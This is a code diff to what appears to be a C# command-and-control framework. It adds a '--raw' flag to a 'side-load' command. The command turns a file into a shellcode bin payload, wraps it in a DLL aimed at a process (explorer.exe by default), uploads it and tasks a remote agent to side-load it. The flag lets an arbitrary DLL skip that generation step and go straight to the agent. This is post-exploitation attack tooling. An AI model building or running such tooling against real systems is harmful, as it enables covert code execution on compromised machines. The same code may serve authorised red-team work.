@@ -21,6 +21,7 @@ namespace Commander.Commands.SideLoad
         public string parameters { get; set; }
         public string processName { get; set; }
         public bool verbose { get; set; }
+        public bool raw { get; set; }
     }
 
     public class SiteLoadCommand : EnhancedCommand<SiteLoadCommandOptions>
@@ -43,6 +44,7 @@ namespace Commander.Commands.SideLoad
             new Argument<string>("parameters", () => string.Empty, "parameters to use"),
             new Option<string>(new[] { "--processName", "-p" }, () => "explorer.exe" ,"process name to start."),
             new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
+            new Option(new[] { "--raw", "-r" }, "inject the raw file"),
         };
 
         protected override async Task<bool> HandleCommand(CommandContext<SiteLoadCommandOptions> context)
@@ -53,23 +55,32 @@ namespace Commander.Commands.SideLoad
                 return false;
             }
 
-            context.Terminal.WriteLine($"Generating bin payload with params {context.CommandParameters}...");
-
-            var result = InjectCommand.GenerateBin(context.Options.fileToSideLoad, this.ComputeParams(context.Options.parameters), out var binFileName);
-            if (context.Options.verbose)
-                context.Terminal.WriteLine(result);
-
-            if (string.IsNullOrEmpty(context.Options.processName))
+            string dllFileName = string.Empty;
+            if (!context.Options.raw)
             {
-                context.Terminal.WriteLine("processName is null");
-                context.Options.processName = "explorer.exe";
-            }
-            context.Terminal.WriteLine($"Generating dll from bin...");
-            result = GenerateDllFromBin(binFileName, context.Options.processName, out var dllFileName);
-            if (context.Options.verbose)
-                context.Terminal.WriteLine(result);
+                context.Terminal.WriteLine($"Generating bin payload with params {context.CommandParameters}...");
 
-            File.Delete(binFileName);
+                var result = InjectCommand.GenerateBin(context.Options.fileToSideLoad, this.ComputeParams(context.Options.parameters), out var binFileName);
+                if (context.Options.verbose)
+                    context.Terminal.WriteLine(result);
+
+                if (string.IsNullOrEmpty(context.Options.processName))
+                {
+                    context.Terminal.WriteLine("processName is null");
+                    context.Options.processName = "explorer.exe";
+                }
+                context.Terminal.WriteLine($"Generating dll from bin...");
+                result = GenerateDllFromBin(binFileName, context.Options.processName, out dllFileName);
+                if (context.Options.verbose)
+                    context.Terminal.WriteLine(result);
+
+                File.Delete(binFileName);
+
+            }
+            else
+            {
+                dllFileName = context.Options.fileToSideLoad;
+            }
 
             context.Terminal.WriteLine($"Pushing {dllFileName} to the server...");
 
@@ -87,9 +98,14 @@ namespace Commander.Commands.SideLoad
                 first = false;
             });
 
-            File.Delete(dllFileName);
+
+            if (!context.Options.raw)
+            {
+                File.Delete(dllFileName);
+                //context.Terminal.WriteLine(fileName);
+            }
+
             string fileName = Path.GetFileName(dllFileName);
-            //context.Terminal.WriteLine(fileName);
 
             await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "side-load", fileId, fileName);
             context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
